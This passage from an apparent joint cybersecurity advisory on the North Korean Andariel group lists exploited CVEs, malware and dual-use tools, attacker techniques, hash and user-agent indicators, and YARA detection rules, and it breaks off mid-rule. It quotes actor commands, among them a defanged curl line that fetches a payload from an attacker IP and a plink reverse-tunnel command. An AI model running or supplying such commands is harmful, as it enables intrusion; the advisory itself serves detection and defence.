<li>CVE-2021-44228 – Apache Log4j&nbsp;</li>
<li>CVE-2021-44142 – Samba vfs_fruit module&nbsp;</li>
<li>CVE-2021-43226, CEV-2021-43207, CVE-2021-36955 – Windows log file vulnerabilities</li>
<li>CVE-2021-41773 – Apache HTTP Server 2.4.49</li>
<li>CVE-2021-40684 – Talend ESB Runtime&nbsp;</li>
<li>CVE-2021-3018 – IPeakCMS 3.5&nbsp;</li>
<li>CVE-2021-20038 – SMA100 Apache httpd server (SonicWall)&nbsp;</li>
<li>CVE-2021-20028 – SonicWall Secure Remote Access (SRA)&nbsp;</li>
<li>CVE-2019-15637 – Tableau&nbsp;</li>
<li>CVE-2019-7609 – Kibana</li>
<li>CVE-2019-0708 – Microsoft Remote Desktop Services&nbsp;</li>
<li>CVE-2017-4946 – VMware V4H and V4PA</li>
</ul>
<h4><strong>Resource Development, Tooling, and Remote Access Tools</strong></h4>
<p>The actors leverage custom tools and malware for discovery and execution. Over the last 15 years, the group has developed RATs, including the following, to permit remote access and manipulation of systems and lateral movement.</p>
<ul>
<li>Atharvan</li>
<li>ELF Backdoor</li>
<li>Jupiter</li>
<li>MagicRAT</li>
<li>“No Pineapple”</li>
<li>TigerRAT</li>
<li>Valefor/VSingle</li>
<li>ValidAlpha</li>
<li>YamaBot</li>
<li>NukeSped</li>
<li>Goat RAT</li>
<li>Black RAT</li>
<li>AndarLoader</li>
<li>DurianBeacon</li>
<li>Trifaux</li>
<li>KaosRAT</li>
<li>Preft</li>
<li>Andariel Scheduled Task Malware</li>
<li>BottomLoader (see Cisco Talos blog Operation Blacksmith)</li>
<li>NineRAT (see Cisco Talos blog Operation Blacksmith)</li>
<li>DLang (see Cisco Talos blog Operation Blacksmith)</li>
<li>Nestdoor (see AhnLab blog)</li>
</ul>
<p>These tools include functionality for executing arbitrary commands, keylogging, screenshots, listing files and directories, browser history retrieval, process snooping, creating and writing to files, capturing network connections, and uploading content to command and control (C2) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1587/001/\" title=\"Develop Capabilities: Malware\">T1587.001</a>, <a href=\"https://attack.mitre.org/versions/v15/techniques/T1587/004/\" title=\"Develop Capabilities: Exploits\">T1587.004</a>]. The tools allow the actors to maintain access to the victim system with each implant having a designated C2 node.</p>
<h4><strong>Commodity Malware and Dual-Use Applications</strong></h4>
<p>Commodity malware is malicious software widely available for purchase or use and is leveraged by numerous different threat actors. Dual-use applications are software tools widely available for purchase or use that are commonly utilized by administrators and users for system administration or other legitimate purposes and also by threat actors for malicious activities. These dual-use applications may reside locally, known as Living Off the Land (LOTL) tools, or be transferred to the target system during the attack. The use of publicly available malware and dual-use applications.&nbsp;The use of publicly available malware &nbsp;and dual-use applications enables the actors to conceal and obfuscate their identities and leads to attribution problems. The authoring agencies are reliant on the use of custom malware and loaders, along with overlapping C2 nodes to attribute commodity malware to the actors. The actors have at times achieved great success obfuscating their identities by&nbsp;leveraging open source malware. The authoring agencies have identified the following open-source and dual-use&nbsp;tools as used and/or customized by the actors:</p>
<ul>
<li>3Proxy [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a>]</li>
<li>AdFind [<a href=\"https://attack.mitre.org/versions/v15/software/S0552/\" title=\"AdFind\">S0552</a>]</li>
<li>AsyncRAT</li>
<li>DeimosC2</li>
<li>Impacket [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a>]</li>
<li>Juggernaut [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1040\" title=\"Network Sniffing\">T1040</a>]</li>
<li>Lilith RAT</li>
<li>ORVX Web Shell</li>
<li>Mimikatz [<a href=\"https://attack.mitre.org/versions/v15/software/S0002/\" title=\"Mimikatz\">S0002</a>]</li>
<li>PLINK [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>]</li>
<li>ProcDump [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a>]</li>
<li>PuTTY [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>]</li>
<li>SOCKS5 [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a>]</li>
<li>Stunnel [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>]&nbsp;</li>
<li>Web Shell by Orb (WSO)</li>
<li>WinRAR [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1560/\" title=\"Archive Collected Data\">T1560</a>]</li>
<li>WinSCP [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1048\" title=\"Exfiltration Over Alternative Protocol\">T1048</a>]</li>
<li>RDP Wrapper [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>]</li>
</ul>
<h4><strong>Initial Access</strong></h4>
<p>The actors gain initial access through widespread exploitation of web servers through known vulnerabilities, such as CVE-2021-44228 (“Log4Shell”) in Apache’s Log4j software library and other CVEs listed above, to deploy web shells and gain access to sensitive information and applications for further exploitation. The actors continue to breach organizations by exploiting web server vulnerabilities in public-facing devices and have conducted widespread activity against a number of different organizations simultaneously [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1190\" title=\"Exploit Public-Facing Application\">T1190</a>].</p>
<h4><strong>Execution</strong></h4>
<p>The actors are well-versed in using native tools and processes on systems, known as living off the land (LOTL). They use Windows command line, PowerShell, Windows Management Instrumentation command line (WMIC), and Linux bash, for system, network, and account enumeration. While individual commands typically vary, the authoring agencies assess the actors prefer <code>netstat</code> commands, such as <code>netstat –naop</code> and <code>netstat –noa</code> [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/\" title=\"Command and Scripting Interpreter\">T1059</a>]. Example commands used by the actors include the following:</p>
<ul>
<li><code>netstat –naop&nbsp;</code></li>
<li><code>netstat –noa</code></li>
<li><code>pvhost.exe -N -R [IP Address]:[Port] -P [Port] -l [username] -pw [password] &lt;Remote_IP&gt;</code></li>
<li><code>curl hxxp[://][IP Address]/tmp/tmp/comp[.]dat -o c:\\users\\public\\notify[.]exe</code></li>
<li><code>C:\\windows\\system32\\cmd.exe /c systeminfo | findstr Logon</code></li>
</ul>
<p>These actors often make typos and other mistakes, indicating that the commands are not directly copied from a playbook and the actors have a flexible and impromptu approach. The typos also illustrate a poor grasp of the English language, including common errors such as “Microsoft Cooperation” (rather than “Microsoft Corporation”) found across numerous RGB 3rd Bureau malware samples.</p>
<h4><strong>Defense Evasion</strong></h4>
<p>The actors routinely pack late-stage tooling in VMProtect and Themida. Malicious tooling packed with these and other commercial tools have advanced anti-debugging and detection capabilities. These files are typically multiple megabytes in size and often contain unusual file section names such as <code>vmp0</code> and <code>vmp1</code> for VMProtect and Themida or randomized file section names for Themida [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1027/\" title=\"Obfuscated Files or Information\">T1027</a>].</p>
<h4><strong>Credential Access</strong></h4>
<p>The actors employ a multi-pronged approach to stealing credentials to gain additional access to systems, including the use of publicly available credential theft utilities and dual-use tools such as Mimikatz, Dumpert, and ProcDump, and accessing the Active Directory domain database through targeting of the <code>NTDS.dit</code> file. The authoring agencies assess the actors change settings on compromised systems to force the system to store credentials and then use the aforementioned tools to steal credentials. In one instance, the actors used the <code>vssadmin</code> command-line utility to back up a volume to retrieve a copy of the <code>NTDS.dit</code> file containing Active Directory data. In another instance, the actors were observed collecting registry hive data for offline extraction of credentials [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a>].</p>
<h4><strong>Discovery</strong></h4>
<p>The actors used customized file system enumeration tooling written in .NET. The tool is capable of receiving and executing command line arguments to enumerate directories and files and compress output files. The tool collects the following information for each drive targeted on a system: depth relative to starting path, name, last write time, last access time, creation time, size, and attributes [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1087\" title=\"Account Discovery\">T1087</a>, <a href=\"https://attack.mitre.org/versions/v15/techniques/T1083\" title=\"File and Directory Discovery\">T1083</a>].&nbsp;</p>
<p>The actors also enumerate directories and files of connected devices using Server Message Block (SMB) protocol, which enables network file sharing and the ability to request services and programs from a network [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1021/002\" title=\"Remote Services: SMB/Windows Admin Shares\">T1021.002</a>].</p>
<h4><strong>Lateral Movement</strong></h4>
<p>The actors also use system logging for discovery to move laterally. The group logs active window changes, clipboard data, and keystrokes and saves the collected logging information to the <code>%Temp%</code> directory.</p>
<p>The actors have also used Remote Desktop Protocol (RDP) to move laterally [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1021\">T1021</a>].</p>
<h4><strong>Command and Control</strong></h4>
<p>The actors leverage techniques and infrastructure positioned around the world to send commands to compromised systems. The actors disguise their malware within HTTP packets to appear as benign network traffic. They also use tunneling tools such as 3Proxy, PLINK, and Stunnel as well as custom proxy tunneling tools to tunnel traffic over a variety of protocols from inside a network back to a C2 server. Tunneling enables the actors to perform C2 operations despite network configurations that would typically pose a challenge, such as the use of Network Address Translation (NAT) or traffic funneled through a web proxy [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a>, <a href=\"https://attack.mitre.org/versions/v15/techniques/T1071/\" title=\"Application Layer Protocol\">T1071</a>].</p>
<h4><strong>Collection and Exfiltration</strong></h4>
<p>Malware previously used by the actors permitted placement and access to search through files that could be of interest, including scanning computer files for keywords related to defense and military sectors in English and Korean. The actors identify data for theft by enumerating files and folders across many directories and servers using command-line activity or functionality built into custom tools. The actors collect the relevant files into RAR archives, sometimes using a version of WinRAR brought into the victim’s environment with other malicious tooling [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1560/\" title=\"Archive Collected Data\">T1560</a>, <a href=\"https://attack.mitre.org/versions/v15/techniques/T1039\" title=\"Data from Network Shared Drive\">T1039</a>].</p>
<p>The actors typically exfiltrate data to web services such as cloud storage or servers not associated with their primary C2. Notably, the actors have been observed logging into actor-controlled cloud-based storage service accounts directly from victim networks to exfiltrate data [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1567\" title=\"Exfiltration Over Web Service\">T1567</a>]. The actors have also been observed using the utilities PuTTY and WinSCP to exfiltrate data to North Korea-controlled servers via File Transfer Protocol (FTP) and other protocols [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1048\" title=\"Exfiltration Over Alternative Protocol\">T1048</a>].</p>
<p>The actors have also been identified staging files for exfiltration on victim machines, establishing Remote Desktop Protocol connections, and conducting <code>HTTP GET</code> requests on port <code>80</code> to receive information [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1021\" title=\"Remote Services\">T1021</a>].</p>
<h2><strong>Indicators of Compromise</strong></h2>
<p>See below for Andariel IOCs.</p>
<p>The following include observed MD5 hashes:</p>
<ul>
<li>88a7c84ac7f7ed310b5ee791ec8bd6c5</li>
<li>6ab4eb4c23c9e419fbba85884ea141f4</li>
<li>97ce00c7ef1f7d98b48291d73d900181</li>
<li>079b4588eaa99a1e802adf5e0b26d8aa</li>
<li>0873b5744d8ab6e3fe7c9754cf7761a3</li>
<li>0d696d27bae69a62def82e308d28857a</li>
<li>0ecf4bac2b070cf40f0b17e18ce312e6</li>
<li>17c46ed7b80c2e4dbea6d0e88ea0827c</li>
<li>1f2410c3c25dadf9e0943cd634558800</li>
<li>2968c20a07cfc97a167aa3dd54124cda</li>
<li>33e85d0f3ef2020cdb0fc3c8d80e8e69</li>
<li>4118d9adce7350c3eedeb056a3335346</li>
<li>4aa57e1c66c2e01f2da3f106ed2303fa</li>
<li>58ad3103295afcc22bde8d81e77c282f</li>
<li>5c41cbf8a7620e10f158f6b70963d1cb</li>
<li>61a949553d35f31957db6442f36730c5</li>
<li>72a22afde3f820422cfdbba7a4cbabde</li>
<li>84bd45e223b018e67e4662c057f2c47e</li>
<li>86465d92f0d690b62866f52f5283b9fc</li>
<li>8b395cc6ecdec0900facf6e93ec48fbb</li>
<li>97f352e2808c78eef9b31c758ca13032</li>
<li>a50f3b7aa11b977ae89285b60968aa67</li>
<li>afd25ce56b9808c5ed7eade75d2e12a7</li>
<li>afdeb24975a318fc5f20d9e61422a308</li>
<li>b697b81b341692a0b137b2c748310ea7</li>
<li>bcac28919fa33704a01d7a9e5e3ddf3f</li>
<li>c027d641c4c1e9d9ad048cda2af85db6</li>
<li>c892c60817e6399f939987bd2bf5dee0</li>
<li>cdeae978f3293f4e783761bc61b34810</li>
<li>d0f310c99476f1712ac082f78dd29fdc</li>
<li>d8da33fae924b991b776797ba8cde24c</li>
<li>e230c5728f9ea5a94e390e7da7bf1ffa</li>
<li>f4d46629ca15313b94992f3798718df7</li>
<li>fb84a392601fc19aeb7f8ce11b3a4907</li>
<li>ff3194d3d5810a42858f3e22c91500b1</li>
<li>13b4ce1fc26d400d34ede460a8530d93</li>
<li>41895c5416fdc82f7e0babc6bb6c7216</li>
<li>c2f8c9bb7df688d0a7030a96314bb493</li>
<li>33a3da2de78418b89a603e28a1e8852c</li>
<li>4896da30a745079cd6265b6332886d45</li>
<li>73eb2f4f101aab6158c615094f7a632a</li>
<li>7f33d2d2a2ce9c195202acb59de31eee</li>
<li>e1afd01400ef405e46091e8ef10c721c</li>
<li>fe25c192875ec1914b8880ea3896cda2</li>
<li>232586f8cfe82b80fd0dfa6ed8795c56</li>
<li>c1f266f7ec886278f030e7d7cd4e9131</li>
<li>49bb2ad67a8c5dfbfe8db2169e6fa46e</li>
<li>beb199b15bd075996fa8d6a0ed554ca8</li>
<li>4053ca3e37ed1f8d37b29eed61c2e729</li>
<li>3a0c8ae783116c1840740417c4fbe678</li>
<li>0414a2ab718d44bf6f7103cff287b312</li>
<li>ca564428a29faf1a613f35d9fa36313f</li>
<li>ad6d4eb34d29e350f96dc8df6d8a092e</li>
<li>dc70dc9845aa747001ebf2a02467c203</li>
<li>3d2ec58f37c8176e0dbcc47ff93e5a76</li>
<li>0a09b7f2317b3d5f057180be6b6d0755</li>
<li>1ffccc23fef2964e9b1747098c19d956</li>
<li>9112efb49cae021abebd3e9a564e6ca4</li>
<li>ac0ada011f1544aa3a1cf27a26f2e288</li>
<li>0211a3160cc5871cbcd4e5514449162b</li>
<li>7416ea48102e2715c87edd49ddbd1526</li>
<li>a2aefb7ab6c644aa8eeb482e27b2dbc4</li>
<li>e7fd7f48fbf5635a04e302af50dfb651</li>
<li>33b2b5b7c830c34c688cf6ced287e5be</li>
<li>e5410abaaac69c88db84ab3d0e9485ac</li>
<li>eb35b75369805e7a6371577b1d2c4531</li>
<li>5a3f3f75048b9cec177838fb8b40b945</li>
<li>9d7bd0caed10cc002670faff7ca130f5</li>
<li>8434cdd34425916be234b19f933ad7ea</li>
<li>bbaee4fe73ccff1097d635422fdc0483</li>
<li>79e474e056b4798e0a3e7c60dd67fd28</li>
<li>95c276215dcc1bd7606c0cb2be06bf70</li>
<li>426bb55531e8e3055c942a1a035e46b9</li>
<li>cfae52529468034dbbb40c9a985fa504</li>
<li>deae4be61c90ad6d499f5bdac5dad242</li>
<li>bda0686d02a8b7685adf937cbcd35f46</li>
<li>6de6c27ca8f4e00f0b3e8ff5185a59d1</li>
<li>c61a8c4f6f6870c7ca0013e084b893d2</li>
<li>5291aed100cc48415636c4875592f70c</li>
<li>f4795f7aec4389c8323f7f40b50ae46f</li>
<li>cf1a90e458966bcba8286d46d6ab052c</li>
<li>792370eb01e16ac3dc511143932d0e1d</li>
<li>612538328e0c4f3e445fb58ef811336a</li>
<li>9767aa592ec2d6ae3c7d40b6049d0466</li>
<li>b22fd0604c4f189f2b7a59c8f48882dd</li>
<li>e53ca714787a86c13f07942a56d64efa</li>
<li>c7b09f1dd0a5694de677f3ecceda41b7</li>
<li>c8346b39418f92725719f364068a218d</li>
<li>730bff14e80ffd7737a97cdf11362ab5</li>
<li>9a481bc83fea1dea3e3bdfff5e154d44</li>
<li>ddb1f970371fa32faae61fc5b8423d4b</li>
<li>6c2b947921e7c77d9af62ce9a3ed7621</li>
<li>977d30b261f64cc582b48960909d0a89</li>
<li>7ce51b56a6b0f8f78056ddfc5b5de67c</li>
<li>dd9625be4a1201c6dfb205c12cf3a381</li>
<li>ecb4a09618e2aba77ea37bd011d7d7f7</li>
<li>0fd8c6f56c52c21c061a94e5765b27b4</li>
<li>c90d094a8fbeaa8a0083c7372bfc1897</li>
<li>0055a266aa536b2fdadb3336ef8d4fba</li>
<li>55bb271bbbf19108fec73d224c9b4218</li>
<li>0c046a2f5304ed8d768795a49b99d6e4</li>
<li>f34664e0d9a10974da117c1ca859dba8</li>
<li>a2c2099d503fcc29478205f5aef0283b</li>
<li>e439f850aa8ead560c99a8d93e472225</li>
<li>7c30ed6a612a1fd252565300c03c7523</li>
<li>81738405a7783c09906da5c7212e606b</li>
<li>c027d641c4c1e9d9ad048cda2af85db6</li>
<li>eb7ba9f7424dffdb7d695b00007a3c6d</li>
<li>3e9ee5982e3054dc76d3ba5cc88ae3de</li>
<li>073e3170a8e7537ff985ec8316319351</li>
<li>9b0e7c460a80f740d455a7521f0eada1</li>
<li>2d02f5499d35a8dffb4c8bc0b7fec5c2</li>
<li>0984954526232f7d05910aa5b07c5893</li>
<li>4156a7283284ece739e1bae05f99e17c</li>
<li>3026d419ee140f3c6acd5bff54132795</li>
<li>7aa132c0cc63a38fb4d1789553266fc7</li>
<li>1a0811472fad0ff507a92c957542fffd</li>
<li>f8aef59d0c5afe8df31e11a1984fbc0a</li>
<li>82491b42b9a2d34b13137e36784a67d7</li>
<li>0a199944f757d5615164e8808a3c712a</li>
<li>9c97ea18da290a6833a1d36e2d419efc</li>
<li>16f768eac33f79775a9672018e0d64f5</li>
</ul>
<div class=\"WordSection1\">
<p>The following include observed SHA-256 hashes:</p>
<ul>
<li>ed8ec7a8dd089019cfd29143f008fa0951c56a35d73b2e1b274315152d0c0ee6</li>
<li>db6a9934570fa98a93a979e7e0e218e0c9710e5a787b18c6948f2eedd9338984</li>
<li>773760fd71d52457ba53a314f15dddb1a74e8b2f5a90e5e150dea48a21aa76df</li>
<li>05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d</li>
<li>e3027062e602c5d1812c039739e2f93fc78341a67b77692567a4690935123abe</li>
<li>1962ebb7bf8d2b306c6f3b55c3dcd69a755eeff1a17577b7606894b781841c3a</li>
<li>f226086b5959eb96bd30dec0ffcbf0f09186cd11721507f416f1c39901addafb</li>
<li>6db57bbc2d07343dd6ceba0f53c73756af78f09fe1cb5ce8e8008e5e7242eae1</li>
<li>b7435d23769e79fcbe69b28df4aef062685d1a631892c2354f96d833eae467be</li>
<li>66415464a0795d0569efa5cb5664785f74ed0b92a593280d689f3a2ac68dca66</li>
<li>def2f01fbd4be85f48101e5ab7ddd82efb720e67daa6838f30fd8dcda1977563</li>
<li>323cbe7a3d050230cfaa822c2a22160b4f8c5fe65481dd329841ee2754b522d9</li>
<li>74529dd15d1953a47f0d7ecc2916b2b92865274a106e453a24943ca9ee434643</li>
<li>1e4de822695570421eb2f12fdfe1d32ab8639655e12180a7ab3cf429e7811b8f</li>
<li>8ce219552e235dcaf1c694be122d6339ed4ff8df70bf358cd165e6eb487ccfc5</li>
<li>c2904dc8bbb569536c742fca0c51a766e836d0da8fac1c1abd99744e9b50164f</li>
<li>dda53eee2c5cb0abdbf5242f5e82f4de83898b6a9dd8aa935c2be29bafc9a469</li>
<li>90fb0cd574155fd8667d20f97ac464eca67bdb6a8ee64184159362d45d79b6a4</li>
<li>452ca47230afd4bb85c45af54fcacbfa544208ef8b4604c3c5caefe3a64dcc19</li>
<li>199ba618efc6af9280c5abd86c09cdf2d475c09c8c7ffc393a35c3d70277aed1</li>
<li>2eb16dbc1097a590f07787ab285a013f5fe235287cb4fb948d4f9cce9efa5dbc</li>
<li>ce779e30502ecee991260fd342cc0d7d5f73d1a070395b4120b8d300ad11d694</li>
<li>db6a9934570fa98a93a979e7e0e218e0c9710e5a787b18c6948f2eedd9338984</li>
<li>c28bb61de4a6ad1c5e225ad9ec2eaf4a6c8ccfff40cf45a640499c0adb0d8740</li>
<li>34d5a5d8bec893519f204b573c33d54537b093c52df01b3d8c518af08ee94947</li>
<li>664f8d19af3400a325998b332343a9304f03bab9738ddab1530869eff13dae54</li>
<li>772b06f34facf6a2ce351b8679ff957cf601ef3ad29645935cb050b4184c8d51</li>
<li>aa29bf4292b68d197f4d8ca026b97ec7785796edcb644db625a8f8b66733ab54</li>
<li>9a5504dcfb7e664259bfa58c46cfd33e554225daf1cedea2ec2a9d83bbbfe238</li>
<li>c2500a6e12f22b16e221ba01952b69c92278cd05632283d8b84c55c916efe27c</li>
<li>8aa6612c95c7cef49709596da43a0f8354f14d8c08128c4cb9b1f37e548f083b</li>
<li>38f0f2d658e09c57fc78698482f2f638843eb53412d860fb3a99bb6f51025b07</li>
</ul>
</div>
<p>The following include a list of user agent strings used by the actors:</p>
<ul>
<li>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</li>
<li>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0</li>
<li>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0</li>
<li>Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0</li>
<li>Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0</li>
<li>Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0</li>
<li>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</li>
<li>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0</li>
<li>Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)</li>
<li>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0</li>
<li>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</li>
<li>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0</li>
</ul>
<h2><strong>Detection Methods</strong></h2>
<p>See Table 2 for YARA rules, created by the FBI, authoring partners, and private industry, that can be used to detect malware used by the actors.</p>
<table>
<caption><em>Table 2. YARA Rules</em></caption>
<tbody>
<tr>
<td>rule Andariel_ScheduledTask_Loader<br>{<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $obfuscation1 = { B8 02 00 00 00 48 6B C0 00 B9 CD FF 00 00 66 89 8C 04 60 01 00 00 B8 02 00 00 00 48 6B C0 01 B9 CC FF 00 00 66 89 8C 04 60 01 00 00 B8 02 00 00 00 48 6B C0 02 B9 8D FF 00 00 66 89 8C 04 60 01 00 00 B8 02 00 00 00 48 6B C0 03 B9 9A FF 00 00 66 89 8C 04 60 01 00 00 B8 02 00 00 00 48 6B C0 04 B9 8C FF 00 00 66 89 8C 04 60 01 00 00 B8 02 00 00 00 48 6B C0 05 B9 8A FF 00 00 66 89 8C 04 60 01 00 00 B8 02 00 00 00 48 6B C0 06 33 C9 66 89 8C 04 60 01 00 00 }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $obfuscation2 = { 48 6B C0 02 C6 44 04 20 BA B8 01 00 00 00 48 6B C0 03 C6 44 04 20 9A B8 01 00 00 00 48 6B C0 04 C6 44 04 20 8B B8 01 00 00 00 48 6B C0 05 C6 44 04 20 8A B8 01 00 00 00 48 6B C0 06 C6 44 04 20 9C B8 01 00 00 00 }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $obfuscation3 = { 48 6B C0 00 C6 44 04 20 A8 B8 01 00 00 00 48 6B C0 01 C6 44 04 20 9A B8 01 00 00 00 48 6B C0 02 C6 44 04 20 93 B8 01 00 00 00 48 6B C0 03 C6 44 04 20 96 B8 01 00 00 00 48 6B C0 04 C6 44 04 20 B9 B8 01 00 00 00 48 6B C0 05 C6 44 04 20 9A B8 01 00 00 00 48 6B C0 06 C6 44 04 20 8B B8 01 00 00 00 48 6B C0 07 C6 44 04 20 9E B8 01 00 00 00 48 6B C0 08 C6 44 04 20 9A B8 01 00 00 00 48 6B C0 09 C6 44 04 20 8D B8 01 00 00 00 48 6B C0 0A C6 44 04 20 BC B8 01 00 00 00 }<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5A4D and $obfuscation1 and $obfuscation2 and $obfuscation3<br>}</td>
</tr>
<tr>
<td>rule Andariel_KaosRAT_Yamabot<br>{<br><br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $str1 = \"/kaos/\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str2 = \"Abstand [\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str3 = \"] anwenden\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str4 = \"cmVjYXB0Y2hh\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str5 = \"/bin/sh\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str6 = \"utilities.CIpaddress\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str7 = \"engine.NewEgg\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str8 = \"%s%04x%s%s%s\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str9 = \"Y2FwdGNoYV9zZXNzaW9u\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str10 = \"utilities.EierKochen\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str11 = \"kandidatKaufhaus\"<br><br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; 3 of them<br>}</td>
</tr>
<tr>
<td>rule TriFaux_EasyRAT_JUPITER<br>{<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $InitOnce = \"InitOnceExecuteOnce\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $BREAK = { 0D 00 0A 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 0D 00 0A }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $Bytes = \"4C,$00,$00,$00,$01,$14,$02,$00,$00,$00,$00,$00,$C0,$00,$00,$00,$00,$00,$00,\" wide<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and all of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_CutieDrop_MagicRAT<br>{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strings:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $config_os_w = \"os/windows\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $config_os_l = \"os/linux\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $config_os_m = \"os/mac\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $config_comp_msft = \"company/microsoft\" ascii 